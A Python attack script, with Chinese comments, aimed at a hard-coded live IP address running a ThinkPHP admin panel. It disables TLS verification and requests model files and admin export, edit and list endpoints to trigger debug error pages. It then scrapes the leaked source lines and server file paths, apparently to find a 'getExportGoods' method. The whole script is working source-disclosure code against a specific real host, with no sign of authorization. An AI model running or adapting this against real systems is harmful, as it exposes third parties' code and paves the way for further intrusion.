#!/usr/bin/env python3
"""tp_model_leak.py - 泄露Goods模型源码 + 找getExportGoods"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=10, context=ctx)
        return r.status, r.read(250000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(250000).decode("utf-8", "ignore")
    except Exception as e:
        return 0, repr(e)[:150]

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        ln = int(m.group(1))
        lines[ln] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

all_lines = {}
# 1. 直接访问模型文件(触发类加载错误, 可能显示模型源码)
print("=== 1. 模型文件探测 ===", flush=True)
for mp in ["/application/admin/model/Goods.php", "/application/admin/model/Good.php",
           "/application/common/model/Goods.php", "/application/common/model/Good.php"]:
    st, b = get(BASE + mp)
    l = leak_lines(b)
    if l:
        print("  %s: %d lines leaked" % (mp, len(l)))
        all_lines.update(l)
    elif st == 200:
        print("  %s: st=200 (no leak)" % mp)

# 2. 通过Export错误让Query模型方法报错, 触发模型源码窗口
print("\n=== 2. 触发模型源码泄露 ===", flush=True)
for url in ["/admin/export/goodslist.html?num=5&page=1",
            "/admin/goods/getList.html?num=5&page=1",
            "/admin/goods/edit.html?id=1",
            "/admin/goodsguige/getList.html?num=5"]:
    st, b = get(BASE + url)
    l = leak_lines(b)
    if l:
        print("  %s: %d lines" % (url, len(l)))
        all_lines.update(l)

# 3. 尝试从错误页找模型文件路径
print("\n=== 3. 文件路径收集 ===", flush=True)
st, b = get(BASE + "/admin/export/goodslist.html?num=5&page=1")
for f in sorted(set(re.findall(r'<a class="toggle" title="([^"]+)"', b))):
    if "thinkphp/library" not in f:
        print("  FILE: %s" % f, flush=True)

print("\n=== 泄露源码汇总 ===", flush=True)
for ln in sorted(all_lines):
    print("  %4d: %s" % (ln, all_lines[ln][:120]), flush=True)
print("=== DONE ===", flush=True)
